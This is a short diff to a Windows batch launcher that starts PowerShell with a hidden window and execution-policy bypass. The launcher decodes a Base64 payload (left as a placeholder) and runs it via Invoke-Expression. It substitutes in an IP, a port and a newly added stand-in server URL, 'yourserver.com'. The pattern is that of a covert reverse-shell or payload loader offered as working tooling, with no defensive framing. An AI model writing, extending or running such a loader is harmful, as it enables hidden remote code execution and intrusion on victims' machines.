@@ -5,9 +5,10 @@
 @echo off
 set ip=%1
 set port=%2
+set serverUrl=http://yourserver.com
 
 powershell -NoP -NonI -W Hidden -Exec Bypass -Command ^
   "$encodedScript = '<Base64_encoded_string>'; ^
   $decodedScript = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($encodedScript)); ^
-  Invoke-Expression ($decodedScript -replace '\$ip', '%ip%' -replace '\$port', '%port%')"
+  Invoke-Expression ($decodedScript -replace '\$ip', '%ip%' -replace '\$port', '%port%' -replace '\$serverUrl', '%serverUrl%')"
 
